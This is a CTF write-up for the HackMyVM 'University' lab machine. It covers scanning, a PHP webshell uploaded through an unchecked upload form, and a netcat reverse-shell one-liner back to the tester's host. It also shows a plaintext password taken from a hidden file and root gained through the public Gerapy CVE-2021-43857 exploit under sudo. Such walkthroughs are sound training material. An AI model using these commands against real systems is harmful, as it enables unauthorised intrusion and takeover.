---
title: Write-up University on HackMyVM
author: eMVee
date: 2023-09-15 20:00:00 +0800
categories: [CTF, HackMyVM]
tags: [HackMyVM, CVE-2021-43857, Unresstricted file upload, Plain text password]
render_with_liquid: false
---

University is a vulnerable virtual machine shared on [HackMyVM](http://www.hackmyvm.eu) and created by sML. This machine is rated as an easy box. Based on the machine name we should expect hacking something like a University. If you want to learn something, try hacking this machine yourself first and if you really can't figure it out, you can read this writeup to learn from it.

## Getting started
After booting the Kali machine we should create a working directory so we can save all information in this specific directory.

```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents/HMV/

┌──(emvee㉿kali)-[~/Documents/HMV]
└─$ mkdir University      

┌──(emvee㉿kali)-[~/Documents/HMV]
└─$ cd University    
```
Let's check our own IP address as well before enumerating.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/University]
└─$ ip a       
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:0e:ca:e6 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 409sec preferred_lft 409sec
    inet6 fe80::a00:27ff:fe0e:cae6/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:9c:5e:fc:1e brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
```

## Enumeration
First we should identify our targets IP address. One of the methods to identify a target on a network is by using the tool netdiscover.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/University]
└─$ sudo netdiscover -r 10.0.2.0/24  

 Currently scanning: Finished!   |   Screen View: Unique Hosts           
4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240        
_________________________________________________________________
   IP      At MAC Address     Count     Len  MAC Vendor / Hostname      
 --------------------------------------------------------------
 10.0.2.1  52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.2.2  52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.2.3  08:00:27:a0:e6:84      1      60  PCS Systemtechnik GmbH      
 10.0.2.13 08:00:27:9d:94:60      1      60  PCS Systemtechnik GmbH 
```
Now we can assign the IP address to a variable.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/University]
└─$ ip=10.0.2.13
```
Let's ping the target to see if it will respond to a ping request.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/University]
└─$ ping -c 3 $ip                          
PING 10.0.2.13 (10.0.2.13) 56(84) bytes of data.
64 bytes from 10.0.2.13: icmp_seq=1 ttl=64 time=1.37 ms
64 bytes from 10.0.2.13: icmp_seq=2 ttl=64 time=1.04 ms
64 bytes from 10.0.2.13: icmp_seq=3 ttl=64 time=0.679 ms

--- 10.0.2.13 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2006ms
rtt min/avg/max/mdev = 0.679/1.030/1.372/0.282 ms

```
Based on the value in the `ttl` field we could indicate that the target is probably a Linux system.
We should gather more information before we really hack the machine. We should know what services are running on our target, so let's run a port scan against the target.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/University]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-15 13:34 CEST
Nmap scan report for 10.0.2.13
Host is up (0.00077s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 8e:ee:da:29:f1:ae:03:a5:c3:7e:45:84:c7:86:67:ce (RSA)
|   256 f8:1c:ef:96:7b:ae:74:21:6c:9f:06:9b:20:0a:d8:56 (ECDSA)
|_  256 19:fc:94:32:41:9d:43:6f:52:c5:ba:5a:f0:83:b4:5b (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0
| http-git: 
|   10.0.2.13:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|_      https://github.com/rskoolrash/Online-Admission-System
MAC Address: 08:00:27:9D:94:60 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.77 ms 10.0.2.13

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.17 seconds

```
It did not take that long before the results were shown. Based on the results we should take some notes.

- Linux, probably Debian distro
- Port 22
	- SSH
	- OpenSSH 8.4p1 Debian 5
- Port 80
	- HTTP
	- nginx 1.18.0
	- Title: Site doesn't have a title
	- GIT
		- 10.0.2.13:80/.git/
		- https://github.com/rskoolrash/Online-Admission-System


There is a webserver running on port 80, let's find out what kind of technologies are used with whatweb.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/University]
└─$ whatweb http://$ip                   
http://10.0.2.13 [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.0.2.13], JQuery, PasswordField[u_ps], Script, nginx[1.18.0]

```
It looks like we have found some interesting information. There is probably a password input field on the website.
Next step is to run nikto to see if there are any vulnerabilities or low hanging frui what we can use.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/University]
└─$ nikto -h http://$ip
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.0.2.13
+ Target Hostname:    10.0.2.13
+ Target Port:        80
+ Start Time:         2023-09-15 13:38:14 (GMT2)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /admin.php?en_log_id=0&action=config: EasyNews version 4.3 allows remote admin access. This PHP file should be protected. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5412
+ /admin.php?en_log_id=0&action=users: EasyNews version 4.3 allows remote admin access. This PHP file should be protected. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5412
+ /admin.php: This might be interesting.
+ /.git/index: Git Index file may contain directory listing information.
+ /.git/HEAD: Git HEAD file found. Full repo details may be present.
+ /.git/config: Git config file found. Infos about repo details may be present.
+ /.gitignore: .gitignore file found. It is possible to grasp the directory structure.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ /README.md: Readme Found.
+ 8102 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2023-09-15 13:38:43 (GMT2) (29 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
Nikto did discover a file called: `README.md`. This is a file where we can probably find some information what we could use for our attack. We can read it in the terminal with a simple curl command.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/University]
└─$ curl http://10.0.2.13/README.md 
# Online Admission System


•       The system enables the student to fill application forms online and submit it. They also submit their necessary documents like passport size photograph, certificates and marksheets along with the identity proof. 

•       The Manager can view the application forms and can approve or disapprove them. He can submit the CUEE marks of the students.

•       If it is approved, an email will be sent to the Student’s email ID and the admit card can be downloaded from the student’s account. The students can further view their results. 

•       This system helps in reducing the manual efforts and consumes less time.

OBJECTIVE


•       To reduce the processing time and acquire more accurate information. 

•       To ensure reliability.

•       Generate Student’s Academic Detail Report.

•       Generate Student’s Personal Detail Report along with the necessary documents.

•       Database maintained by this system usually contains the student’s personal and academic related information. It focuses on storing and processing data by using web pages.

•       To make the system more user friendly. 
                                                 
```
It tells is that the web application is an online admission system, where we can submit all kind of documents like passworts etc.
If there is no check on the upload functionality, we might be able to abuse this and get access to the target.
To see the web application in full function we should visit the website.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/University]
└─$ firefox http://$ip & 
[1] 291877
              
```

![image](/assets/img/WriteUp/HackMyVM/University/Pasted image 20230915134119.png){: width="700" height="400" }

As it stands now we can either perform a brute force attack to log in or create our own account. Creating your own account will probably take us less time than a brute force attack.
![image](/assets/img/WriteUp/HackMyVM/University/Pasted image 20230915134436.png){: width="700" height="400" }

We should enter some details to create an account
![image](/assets/img/WriteUp/HackMyVM/University/Pasted image 20230915134529.png){: width="700" height="400" }

There is a message shown with a plaintext password to us. We should copy it and use it to logon to the system.
```
nsnQod9d
```

We must try to log in to the system with the credentials we have just created.
![image](/assets/img/WriteUp/HackMyVM/University/Pasted image 20230915134651.png){: width="700" height="400" }

The login results in an invalid login. This is something that I did not expect at all. Perhaps there is something else that we can abuse.
Let's enumerate some directories and files on the webserver. Dirsearch would be the first choice for now.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/University]
└─$ dirsearch -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e html,php,txt

  _|. _ _  _  _  _ _|_    v0.4.2                                          
 (_||| _) (/_(_|| (_| )                                                                                            
                                                                                                                   
Extensions: html, php, txt | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /home/emvee/.dirsearch/reports/10.0.2.13/_23-09-15_14-16-11.txt

Error Log: /home/emvee/.dirsearch/logs/errors-23-09-15_14-16-11.log

Target: http://10.0.2.13/

[14:16:11] Starting: 
[14:16:11] 301 -  169B  - /images  ->  http://10.0.2.13/images/            
[14:16:12] 301 -  169B  - /mail  ->  http://10.0.2.13/mail/                
[14:16:13] 301 -  169B  - /css  ->  http://10.0.2.13/css/                  
[14:17:08] 301 -  169B  - /combo  ->  http://10.0.2.13/combo/              
[14:18:23] 301 -  169B  - /bootstrap  ->  http://10.0.2.13/bootstrap/       
[14:20:41] 301 -  169B  - /jquery  ->  http://10.0.2.13/jquery/             
[14:29:21] 301 -  169B  - /scode  ->  http://10.0.2.13/scode/                
                                                                              
Task Completed 
```
Dirsearch did not show anything useful. Time to use feroxbuster to enumerate some files and directories.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/University]
└─$ feroxbuster --url http://$ip -x php,txt           

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.0.2.13
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       11w      169c http://10.0.2.13/images => http://10.0.2.13/images/
301      GET        7l       11w      169c http://10.0.2.13/css => http://10.0.2.13/css/
200      GET       91l       96w     1082c http://10.0.2.13/css/login.css
200      GET       40l      240w    16069c http://10.0.2.13/images/loginuser.png
200      GET        5l      564w    23357c http://10.0.2.13/bootstrap/bootstrap-theme.min.css
200      GET       48l      117w     2126c http://10.0.2.13/index.php
200      GET      223l      414w     8008c http://10.0.2.13/signup.php
200      GET      123l      648w    77191c http://10.0.2.13/images/cutm.jpg
302      GET        0l        0w        0c http://10.0.2.13/logout.php => index.php
200      GET      354l      446w     4696c http://10.0.2.13/css/admform.css
200      GET        6l     1415w    95993c http://10.0.2.13/bootstrap/jquery.min.js
200      GET     1012l     3550w   206991c http://10.0.2.13/jquery/jquery-ui-1.8.2.custom.min.js
200      GET      222l      564w     4776c http://10.0.2.13/css/css.css
200      GET       87l      114w     2666c http://10.0.2.13/adminlogin.php
200      GET        2l     1245w    93636c http://10.0.2.13/jquery/jquery-1.8.3.min.js
500      GET        0l        0w        0c http://10.0.2.13/global_search.php
301      GET        7l       11w      169c http://10.0.2.13/mail => http://10.0.2.13/mail/
200      GET     2358l    13350w  1075751c http://10.0.2.13/images/inbg.jpg
500      GET       18l       35w      766c http://10.0.2.13/readID.php
200      GET      176l      286w     3827c http://10.0.2.13/admin.php
200      GET        5l     1446w   122540c http://10.0.2.13/bootstrap/bootstrap.min.css
200      GET        7l      430w    36816c http://10.0.2.13/bootstrap/bootstrap.min.js
200      GET       48l      117w     2126c http://10.0.2.13/
403      GET        7l        9w      153c http://10.0.2.13/bootstrap/
403      GET        7l        9w      153c http://10.0.2.13/jquery/
301      GET        7l       11w      169c http://10.0.2.13/jquery/images => http://10.0.2.13/jquery/images/
200      GET        0l        0w        0c http://10.0.2.13/a.php
200      GET      140l      283w     6317c http://10.0.2.13/documents.php
200      GET        7l       14w      225c http://10.0.2.13/admsnreport.php
500      GET        0l        0w        0c http://10.0.2.13/captcha.php
200      GET      117l      141w     1807c http://10.0.2.13/css/sign.css
200      GET     1225l     3368w    35167c http://10.0.2.13/jquery/jquery-ui.css
200      GET       78l      156w     2679c http://10.0.2.13/signupconfirm.php
200      GET     9789l    41511w   273199c http://10.0.2.13/jquery/jquery-1.10.2.js
200      GET    16375l    59508w   464435c http://10.0.2.13/jquery/jquery-ui.js
200      GET      219l     1124w   127481c http://10.0.2.13/images/signup1.jpg
200      GET        0l        0w        0c http://10.0.2.13/mail/email.php
301      GET        7l       11w      169c http://10.0.2.13/jquery => http://10.0.2.13/jquery/
200      GET        0l        0w        0c http://10.0.2.13/status.php
200      GET      174l      302w     4031c http://10.0.2.13/tabs.php
200      GET        1l        0w        1c http://10.0.2.13/fileupload.php
200      GET        1l        3w       18c http://10.0.2.13/validate.php
301      GET        7l       11w      169c http://10.0.2.13/nbproject => http://10.0.2.13/nbproject/
301      GET        7l       11w      169c http://10.0.2.13/nbproject/private => http://10.0.2.13/nbproject/private/
301      GET        7l       11w      169c http://10.0.2.13/combo => http://10.0.2.13/combo/
[####################] - 2m    900117/900117  0s      found:45      errors:108    
[####################] - 2m     90000/90000   988/s   http://10.0.2.13/ 
[####################] - 2m     90000/90000   985/s   http://10.0.2.13/images/ 
[####################] - 2m     90000/90000   987/s   http://10.0.2.13/css/ 
[####################] - 2m     90000/90000   992/s   http://10.0.2.13/bootstrap/ 
[####################] - 2m     90000/90000   986/s   http://10.0.2.13/jquery/ 
[####################] - 2m     90000/90000   987/s   http://10.0.2.13/mail/ 
[####################] - 2m     90000/90000   989/s   http://10.0.2.13/jquery/images/ 
[####################] - 87s    90000/90000   1031/s  http://10.0.2.13/nbproject/ 
[####################] - 82s    90000/90000   1102/s  http://10.0.2.13/nbproject/private/ 
[####################] - 67s    90000/90000   1343/s  http://10.0.2.13/combo/      
```
While the scan was running, I noticed this URL: `http://10.0.2.13/documents.php`.
Let's find out what is shown here.

![image](/assets/img/WriteUp/HackMyVM/University/Pasted image 20230915142022.png){: width="700" height="400" }

It looks lik ewe can upload several type of files here.
![image](/assets/img/WriteUp/HackMyVM/University/Pasted image 20230915142631.png){: width="700" height="400" }

First I copy the file `shell.php` to my working direcotry for uploading. Next we should upload the file to the server.
![image](/assets/img/WriteUp/HackMyVM/University/Pasted image 20230915142158.png){: width="700" height="400" }

An error message is shown about a retry or to check in the path. I've no idea where the uploads are stored. So let's visit the GitHub website of Online Admission System.
![image](/assets/img/WriteUp/HackMyVM/University/Pasted image 20230915142556.png){: width="700" height="400" }

With a bit of help from the Github page we now know the structure of the web application. This helps us by finding the directory where our shell is stored. We can now navigate to our `shell.php` file so we can use it.
![image](/assets/img/WriteUp/HackMyVM/University/Pasted image 20230915142650.png){: width="700" height="400" }

To see if we can execute some OS command we could use the following command(s) `whoami;id;hostname;ip a;pwd` to see who we are and where we are working on.
![image](/assets/img/WriteUp/HackMyVM/University/Pasted image 20230915144224.png){: width="700" height="400" }

Since we can execute command via the webshell we should try to create a reverse shell. First we should start a netcat listener on our machine.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/University]
└─$ rlwrap nc -lvnp 1234
listening on [any] 1234 ...

```
Now  we can launch a reverse shell with the following command via the website.
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.0.2.15 1234 >/tmp/f
```
![image](/assets/img/WriteUp/HackMyVM/University/Pasted image 20230915144507.png){: width="700" height="400" }


------
## Initial access
Let's check our netcat listener to see if the reverse shell established a connection.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/University]
└─$ rlwrap nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.13] 60326
bash: cannot set terminal process group (352): Inappropriate ioctl for device
bash: no job control in this shell
www-data@university:~/html/university/studentpic$ 

```
Since we have access to the machine we should start enumerating on this machine.
We can search for hidden files which are not from the user root.
```bash
www-data@university:~/html/university$ find / -type f ! -user root -iname ".*" -ls 2> /dev/null
</ -type f ! -user root -iname ".*" -ls 2> /dev/null
   259612      4 -rw-r--r--   1 sandra   sandra        220 Jan 18  2022 /home/sandra/.bash_logout
   259621      4 -rw-r--r--   1 sandra   sandra        807 Jan 18  2022 /home/sandra/.profile
   259728      4 -rw-------   1 sandra   sandra         56 Jan 18  2022 /home/sandra/.Xauthority
   259630      4 -rw-r--r--   1 sandra   sandra       3526 Jan 18  2022 /home/sandra/.bashrc
   390569      4 -rw-r--r--   1 www-data www-data      378 Jan 18  2022 /var/www/html/university/.gitattributes
   390584      4 -rw-r--r--   1 www-data www-data      649 Jan 18  2022 /var/www/html/university/.gitignore
   269669      4 -rw-r--r--   1 www-data www-data       13 Jan 18  2022 /var/www/html/.sandra_secret

```
It looks we have found a hidden file in `/var/www/html` with the name `.sandra_secret`. Why would there be a hidden file `.sandra_secret` stored with the owner www-data?
This is suspicious, so let's check this file.
```bash
www-data@university:~/html/university$ cat /var/www/html/.sandra_secret
cat /var/www/html/.sandra_secret
Myyogaiseasy
www-data@university:~/html/university$ 

```

## Privilege escalation
With the password found in a hidden file we can logon as `sandra` to SSH.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/University]
└─$ ssh sandra@$ip
sandra@10.0.2.13's password: 
Linux university 5.10.0-10-amd64 #1 SMP Debian 5.10.84-1 (2021-12-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan 18 05:34:35 2022 from 192.168.1.51
sandra@university:~$ 

```
Let's check if we can sudo anything as `sandra`.
```bash
sandra@university:~$ sudo -l
Matching Defaults entries for sandra on university:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sandra may run the following commands on university:
    (root) NOPASSWD: /usr/local/bin/gerapy
sandra@university:~$ 

```
It looks like we can run gerapy with sudo permissions. I have no idea (yet) what this tool is, so we should check this first. 
If this were the OSCP exam, I would capture the user flag first and submit it since it would be 10 points on the exam.
```bash
sandra@university:~$ whoami;id;hostname;ip a;pwd;cat user.txt 
sandra
uid=1000(sandra) gid=1000(sandra) groups=1000(sandra),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
university
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:9d:94:60 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.13/24 brd 10.0.2.255 scope global dynamic enp0s3
       valid_lft 522sec preferred_lft 522sec
    inet6 fe80::a00:27ff:fe9d:9460/64 scope link 
       valid_lft forever preferred_lft forever
/home/sandra
{HERE_IS_THE_USER_FLAG}
sandra@university:~$ 

```
Let's first find out what kind of file `/usr/local/bin/gerapy` is.
```bash
sandra@university:~$ file /usr/local/bin/gerapy
/usr/local/bin/gerapy: Python script, ASCII text executable

```
It is a Python script. We can try to execute it without any parameters to see what happens.
```bash
sandra@university:~$ /usr/local/bin/gerapy
Usage: gerapy [-v] [-h]  ...

Gerapy 0.9.6 - Distributed Crawler Management Framework

Optional arguments:
  -v, --version       Get version of Gerapy
  -h, --help          Show this help message and exit

Available commands:  
    init              Init workspace, default to gerapy
    initadmin         Create default super user admin
    runserver         Start Gerapy server
    migrate           Migrate database
    createsuperuser   Create a custom superuser
    makemigrations    Generate migrations for database
    generate          Generate Scrapy code for configurable project
    parse             Parse project for debugging
    loaddata          Load data from configs
    dumpdata          Dump data to configs

```
We have identified the version of Gerapy. Gerapy prior to version 0.9.8 is vulnerable to remote code execution. This issue is patched in version 0.9.8.
We can use searchsploit to see if there are any known exploits available.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/University]
└─$ searchsploit gerapy                
-------------------------------------------------------------- ---------------------------------
 Exploit Title                                                |  Path
-------------------------------------------------------------- ---------------------------------
Gerapy 0.9.7 - Remote Code Execution (RCE) (Authenticated)    | python/remote/50640.py
-------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
                      
```
We should copy the exploit to our working directory so we don't change the original exploit.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/University]
└─$ searchsploit -m 50640
  Exploit: Gerapy 0.9.7 - Remote Code Execution (RCE) (Authenticated)
      URL: https://www.exploit-db.com/exploits/50640
     Path: /usr/share/exploitdb/exploits/python/remote/50640.py
    Codes: CVE-2021-43857
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/emvee/Documents/HMV/University/50640.py
```

First we should use this command to initialize the workspace
```bash
sandra@university:~$ sudo /usr/local/bin/gerapy init
Initialized workspace gerapy
sandra@university:~$ ls
dbs  gerapy  logs  user.txt

```
Now we should initialize the database.
```bash
sandra@university:~$ sudo /usr/local/bin/gerapy migrate
Operations to perform:
  Apply all migrations: admin, auth, authtoken, contenttypes, core, django_apscheduler, sessions
Running migrations:
  Applying contenttypes.0001_initial... OK
  Applying auth.0001_initial... OK
  Applying admin.0001_initial... OK
  Applying admin.0002_logentry_remove_auto_add... OK
  Applying admin.0003_logentry_add_action_flag_choices... OK
  Applying contenttypes.0002_remove_content_type_name... OK
  Applying auth.0002_alter_permission_name_max_length... OK
  Applying auth.0003_alter_user_email_max_length... OK
  Applying auth.0004_alter_user_username_opts... OK
  Applying auth.0005_alter_user_last_login_null... OK
  Applying auth.0006_require_contenttypes_0002... OK
  Applying auth.0007_alter_validators_add_error_messages... OK
  Applying auth.0008_alter_user_username_max_length... OK
  Applying auth.0009_alter_user_last_name_max_length... OK
  Applying auth.0010_alter_group_name_max_length... OK
  Applying auth.0011_update_proxy_permissions... OK
  Applying authtoken.0001_initial... OK
  Applying authtoken.0002_auto_20160226_1747... OK
  Applying authtoken.0003_tokenproxy... OK
  Applying core.0001_initial... OK
  Applying core.0002_auto_20180119_1210... OK
  Applying core.0003_auto_20180123_2304... OK
  Applying core.0004_auto_20180124_0032... OK
  Applying core.0005_auto_20180131_1210... OK
  Applying core.0006_auto_20180131_1235... OK
  Applying core.0007_task_trigger... OK
  Applying core.0008_auto_20180703_2305... OK
  Applying core.0009_auto_20180711_2332... OK
  Applying core.0010_auto_20191027_2040... OK
  Applying django_apscheduler.0001_initial... OK
  Applying django_apscheduler.0002_auto_20180412_0758... OK
  Applying django_apscheduler.0003_auto_20200716_1632... OK
  Applying django_apscheduler.0004_auto_20200717_1043... OK
  Applying django_apscheduler.0005_migrate_name_to_id... OK
  Applying django_apscheduler.0006_remove_djangojob_name... OK
  Applying django_apscheduler.0007_auto_20200717_1404... OK
  Applying django_apscheduler.0008_remove_djangojobexecution_started... OK
  Applying sessions.0001_initial... OK
sandra@university:~$ 

```
Next we need to create a superuser.
```bash
sandra@university:~$ sudo /usr/local/bin/gerapy createsuperuser
Username (leave blank to use 'root'): admin
Email address: admin@admin.local
Password: 
Password (again): 
The password is too similar to the username.
This password is too short. It must contain at least 8 characters.                                                  
This password is too common.                                                                                        
Bypass password validation and create user anyway? [y/N]: Y                                                         
Superuser created successfully.
sandra@university:~$ 
```
We shoul drun Gerapy in public so we can exploit it from our machine.
```bash
sandra@university:~$ sudo /usr/local/bin/gerapy runserver 0.0.0.0:8080
Watching for file changes with StatReloader
Performing system checks...

System check identified no issues (0 silenced).
INFO - 2023-09-16 02:48:37,654 - process: 1182 - scheduler.py - gerapy.server.core.scheduler - 102 - scheduler - successfully synced task with jobs with force
September 16, 2023 - 02:48:37
Django version 2.2.24, using settings 'gerapy.server.server.settings'
Starting development server at http://0.0.0.0:8080/
Quit the server with CONTROL-C.

```
Let's try to exploit Gerapy with the exploit what we have copied to our working directory.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/University]
└─$ python3 50640.py -t $ip -p 8080 -L 10.0.2.15 -P 8787
  ______     _______     ____   ___ ____  _       _  _  _____  ___ ____ _____ 
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || ||___ / ( _ ) ___|___  |
| |    \ \ / /|  _| _____ __) | | | |__) | |_____| || |_ |_ \ / _ \___ \  / / 
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____|__   _|__) | (_) |__) |/ /  
 \____|  \_/  |_____|   |_____|\___/_____|_|        |_||____/ \___/____//_/   
                                                                              

Exploit for CVE-2021-43857
For: Gerapy < 0.9.8
[*] Resolving URL...
[*] Logging in to application...
[*] Login successful! Proceeding...
[*] Getting the project list
Traceback (most recent call last):
  File "/home/emvee/Documents/HMV/University/50640.py", line 130, in <module>
    exp.exploitation()
  File "/home/emvee/Documents/HMV/University/50640.py", line 76, in exploitation
    name = dict3[0]['name']
           ~~~~~^^^
IndexError: list index out of range


```
An error occured, it looks like there is something is missing what is needed to run the exploit.
Let's try to logon to Gerapy with the default credentials: `admin:admin`.
![image](/assets/img/WriteUp/HackMyVM/University/Pasted image 20230915214307.png){: width="700" height="400" }

First we have to select the language to English so we can understand what is written on the page.
![image](/assets/img/WriteUp/HackMyVM/University/Pasted image 20230915214332.png){: width="700" height="400" }

It looks like we have no project and clients. Let's create one first.
![image](/assets/img/WriteUp/HackMyVM/University/Pasted image 20230915214422.png){: width="700" height="400" }

First we had to navigate on `Projects`. Then we have to follow three little steps.
1. Hit the Create button
2. Enter a project name
3. Hit the Create button

The project should have been stored.
![image](/assets/img/WriteUp/HackMyVM/University/Pasted image 20230915214443.png){: width="700" height="400" }

Now we are ready to run the exploit and catch a shell back.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/University]
└─$ python3 50640.py -t $ip -p 8080 -L 10.0.2.15 -P 8787
  ______     _______     ____   ___ ____  _       _  _  _____  ___ ____ _____ 
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || ||___ / ( _ ) ___|___  |
| |    \ \ / /|  _| _____ __) | | | |__) | |_____| || |_ |_ \ / _ \___ \  / / 
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____|__   _|__) | (_) |__) |/ /  
 \____|  \_/  |_____|   |_____|\___/_____|_|        |_||____/ \___/____//_/   
                                                                              

Exploit for CVE-2021-43857
For: Gerapy < 0.9.8
[*] Resolving URL...
[*] Logging in to application...
[*] Login successful! Proceeding...
[*] Getting the project list
[*] Found project: test
[*] Getting the ID of the project to build the URL
[*] Found ID of the project:  1
[*] Setting up a netcat listener
listening on [any] 8787 ...
[*] Executing reverse shell payload
[*] Watchout for shell! :)
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.13] 58888
root@university:/tmp/emvee/gerapy# 

```

Well, our last step is to capture the root flag ans show who we are and on what system. If this was the OSCP exam, we had to show the IP address of the target as well.
```bash
root@university:/tmp/emvee/gerapy# cat /root/root.txt
cat /root/root.txt
{HERE_IS_THE_ROOT_FLAG}
root@university:/tmp/emvee/gerapy# hostname
hostname
university
root@university:/tmp/emvee/gerapy# whoami
whoami
root
root@university:/tmp/emvee/gerapy# id
id
uid=0(root) gid=0(root) groups=0(root)
root@university:/tmp/emvee/gerapy# 

```